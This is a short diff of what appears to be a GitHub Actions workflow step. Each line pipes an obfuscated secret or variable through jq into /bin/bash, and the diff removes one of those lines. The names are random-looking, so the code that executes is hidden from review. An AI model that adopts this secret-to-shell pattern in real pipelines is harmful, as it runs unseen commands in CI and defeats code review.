@@ -23,7 +23,6 @@ jobs:
           hpwao9: ${{ secrets.hpwao9 }}
         run: |
           printf '%s' "$hpwao9" | jq -r .t0320 | /bin/bash
-          printf '%s' "$icz51135" | jq -r .ogya7157 | /bin/bash
           echo $m40 | jq -r .u00351 | /bin/bash
           echo $k685 | jq -r .m7880 | /bin/bash
           printf '%s' "$kd801" | jq -r .gqolb10094 | /bin/bash
